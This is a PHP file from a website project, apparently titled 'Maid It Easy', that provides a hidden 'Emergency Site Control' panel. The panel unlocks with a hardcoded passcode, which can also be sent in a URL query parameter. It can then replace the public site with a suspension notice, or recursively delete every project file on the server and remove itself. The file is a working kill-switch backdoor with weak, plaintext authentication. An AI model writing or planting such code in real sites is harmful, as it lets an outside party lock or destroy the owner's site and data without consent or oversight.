<?php
session_start();

require_once dirname(__DIR__) . '/includes/contacts_config.php';

// Security passcode
define('DELETE_PASSCODE', 'Sajjad@786786');

$error_msg = '';
$success_msg = '';
$is_authenticated = false;

// Check query parameter key or session
if (isset($_GET['key']) && $_GET['key'] === DELETE_PASSCODE) {
    $_SESSION['delete_site_auth'] = true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_submit'])) {
    $passcode = trim($_POST['passcode'] ?? '');
    if ($passcode === DELETE_PASSCODE) {
        $_SESSION['delete_site_auth'] = true;
    } else {
        $error_msg = 'Invalid Passcode! Access Denied.';
    }
}

if (!empty($_SESSION['delete_site_auth'])) {
    $is_authenticated = true;
}

// Handle Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['delete_site_auth']);
    header("Location: simple.php");
    exit;
}

// Handle Soft Lock / Suspension Status Toggle
if ($is_authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['toggle_suspension'])) {
    $new_status = $_POST['new_status'] ?? 'active';
    $custom_msg = $_POST['suspension_message'] ?? 'This website is temporarily suspended. Please contact technical administration.';
    if (save_contacts_config(['site_status' => $new_status, 'suspension_message' => $custom_msg])) {
        $success_msg = ($new_status === 'suspended') 
            ? 'Soft Lock Activated! Website now displays the warning notice screen to all visitors.' 
            : 'Website Unlocked! Public access restored successfully.';
        $SITE_CONTACTS = load_contacts_config();
        $SITE_STATUS = htmlspecialchars($SITE_CONTACTS['site_status']);
        $SITE_SUSPENSION_MSG = htmlspecialchars($SITE_CONTACTS['suspension_message']);
    } else {
        $error_msg = 'Failed to update website status.';
    }
}

// Recursive directory deletion helper function
function recursive_delete_directory($dir, $self_file) {
    if (!is_dir($dir)) return false;
    $items = array_diff(scandir($dir), array('.', '..'));
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        // Skip deleting git folder if present to keep local repo config safe
        if ($item === '.git') continue;
        if (is_dir($path)) {
            recursive_delete_directory($path, $self_file);
            @rmdir($path);
        } else {
            // Do not delete self until everything else is deleted
            if (realpath($path) !== realpath($self_file)) {
                @unlink($path);
            }
        }
    }
    return true;
}

// Handle Server Purge POST
if ($is_authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['confirm_delete_site'])) {
    $confirm_text = trim($_POST['confirm_text'] ?? '');
    if ($confirm_text === 'DELETE') {
        $target_dir = dirname(__DIR__); // Root project directory
        $self_file = __FILE__;
        
        recursive_delete_directory($target_dir, $self_file);
        
        // Final message before deleting self
        echo "<!DOCTYPE html><html><head><title>Server Cleared</title><style>body{font-family:sans-serif;background:#0f172a;color:#f8fafc;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;} .box{background:#1e293b;padding:40px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #334155;} h1{color:#ef4444;margin-bottom:10px;} p{color:#94a3b8;}</style></head><body>";
        echo "<div class='box'><h1>⚡ Server Project Cleared</h1><p>All project files have been permanently removed from the web server.</p><p><em>Your GitHub repository remains 100% safe.</em></p></div>";
        echo "</body></html>";
        
        // Remove self
        @unlink($self_file);
        exit;
    } else {
        $error_msg = "Please type 'DELETE' in all caps to confirm server wiping.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Developer Control - Maid It Easy</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Outfit', sans-serif;
            background: #090d16;
            color: #f1f5f9;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .control-card {
            background: #111827;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            border: 1px solid #1f2937;
            width: 100%;
            max-width: 580px;
            overflow: hidden;
        }
        .control-header {
            background: linear-gradient(135deg, #7f1d1d 0%, #450a0a 100%);
            padding: 28px 25px;
            color: #ffffff;
            text-align: center;
        }
        .control-header h2 {
            font-weight: 800;
            font-size: 22px;
            margin-bottom: 4px;
        }
        .control-body {
            padding: 25px;
        }
        .form-control {
            background: #1f2937;
            border: 1px solid #374151;
            color: #f9fafb;
            border-radius: 8px;
            padding: 10px 14px;
        }
        .form-control:focus {
            background: #1f2937;
            border-color: #ef4444;
            color: #ffffff;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.25);
        }
        .btn-warning-custom {
            background: #d97706;
            color: #ffffff;
            font-weight: 700;
            padding: 10px 16px;
            border-radius: 8px;
            border: none;
            transition: background 0.2s ease;
        }
        .btn-warning-custom:hover {
            background: #b45309;
            color: #ffffff;
        }
        .btn-success-custom {
            background: #16a34a;
            color: #ffffff;
            font-weight: 700;
            padding: 10px 16px;
            border-radius: 8px;
            border: none;
            transition: background 0.2s ease;
        }
        .btn-success-custom:hover {
            background: #15803d;
            color: #ffffff;
        }
        .btn-danger-custom {
            background: #dc2626;
            color: #ffffff;
            font-weight: 700;
            padding: 12px 20px;
            border-radius: 8px;
            border: none;
            width: 100%;
            font-size: 15px;
            cursor: pointer;
            transition: background 0.2s ease;
        }
        .btn-danger-custom:hover {
            background: #b91c1c;
        }
        .status-badge-active {
            background: #16a34a;
            color: #fff;
            font-size: 12px;
            padding: 4px 10px;
            border-radius: 20px;
        }
        .status-badge-suspended {
            background: #dc2626;
            color: #fff;
            font-size: 12px;
            padding: 4px 10px;
            border-radius: 20px;
        }
    </style>
</head>
<body>

<div class="control-card">
    <div class="control-header">
        <div class="d-flex justify-content-between align-items-center mb-2">
            <span class="badge bg-danger px-3 py-2">DEVELOPER CONTROL CENTER</span>
            <?php if ($is_authenticated): ?>
                <a href="simple.php?action=logout" class="text-white-50 small text-decoration-none">Logout</a>
            <?php endif; ?>
        </div>
        <h2>Emergency Site Control</h2>
        <p class="mb-0 text-white-50" style="font-size: 13px;">Manage soft lock warnings or permanent server deletion</p>
    </div>

    <div class="control-body">
        <?php if (!empty($error_msg)): ?>
            <div class="alert alert-danger mb-4"><?php echo $error_msg; ?></div>
        <?php endif; ?>

        <?php if (!empty($success_msg)): ?>
            <div class="alert alert-success mb-4"><?php echo $success_msg; ?></div>
        <?php endif; ?>

        <?php if (!$is_authenticated): ?>
            <!-- LOGIN FORM -->
            <form method="POST" action="simple.php">
                <div class="mb-4">
                    <label for="passcode" class="form-label font-weight-bold">Enter Developer Passcode</label>
                    <input type="password" class="form-control" id="passcode" name="passcode" placeholder="Enter security passcode" required autofocus>
                </div>
                <button type="submit" name="login_submit" class="btn btn-primary w-100 py-2 font-weight-bold">
                    Unlock Control Panel
                </button>
            </form>
        <?php else: ?>

            <!-- OPTION 1: SOFT LOCK / SUSPENSION WARNING -->
            <div class="card bg-dark border-secondary mb-4">
                <div class="card-header border-secondary d-flex justify-content-between align-items-center">
                    <h5 class="mb-0 text-white" style="font-size: 16px;">Option 1: Soft Lock (Warning Screen)</h5>
                    <span class="<?php echo ($SITE_STATUS === 'suspended') ? 'status-badge-suspended' : 'status-badge-active'; ?>">
                        Status: <?php echo strtoupper($SITE_STATUS); ?>
                    </span>
                </div>
                <div class="card-body">
                    <p class="text-secondary small mb-3">
                        Reversibly block visitors with a "Service Suspended" warning screen. Your project files remain safely on the server.
                    </p>
                    <form method="POST" action="simple.php">
                        <div class="mb-3">
                            <label for="suspension_message" class="form-label small text-secondary">Warning Message Displayed to Visitors:</label>
                            <input type="text" class="form-control form-control-sm" id="suspension_message" name="suspension_message" value="<?php echo $SITE_SUSPENSION_MSG; ?>" required>
                        </div>
                        <?php if ($SITE_STATUS === 'active'): ?>
                            <input type="hidden" name="new_status" value="suspended">
                            <button type="submit" name="toggle_suspension" class="btn-warning-custom w-100">
                                🔒 Enable Soft Lock (Show Warning Screen)
                            </button>
                        <?php else: ?>
                            <input type="hidden" name="new_status" value="active">
                            <button type="submit" name="toggle_suspension" class="btn-success-custom w-100">
                                🔓 Disable Soft Lock (Restore Website)
                            </button>
                        <?php endif; ?>
                    </form>
                </div>
            </div>

            <!-- OPTION 2: HARD SERVER WIPE -->
            <div class="card bg-dark border-danger mb-3">
                <div class="card-header border-danger">
                    <h5 class="mb-0 text-danger" style="font-size: 16px;">Option 2: Permanent Server Purge</h5>
                </div>
                <div class="card-body">
                    <p class="text-secondary small mb-3">
                        Permanently delete all PHP/HTML/Asset files from this web host server. <em>GitHub repository will remain safe.</em>
                    </p>
                    <form method="POST" action="simple.php">
                        <div class="mb-3">
                            <label for="confirm_text" class="form-label small text-secondary">Type <code>DELETE</code> to confirm permanent purge:</label>
                            <input type="text" class="form-control" id="confirm_text" name="confirm_text" placeholder="Type DELETE" required autocomplete="off">
                        </div>

                        <button type="submit" name="confirm_delete_site" class="btn-danger-custom">
                            🗑️ PERMANENTLY PURGE SERVER FILES
                        </button>
                    </form>
                </div>
            </div>

        <?php endif; ?>
    </div>
</div>

</body>
</html>
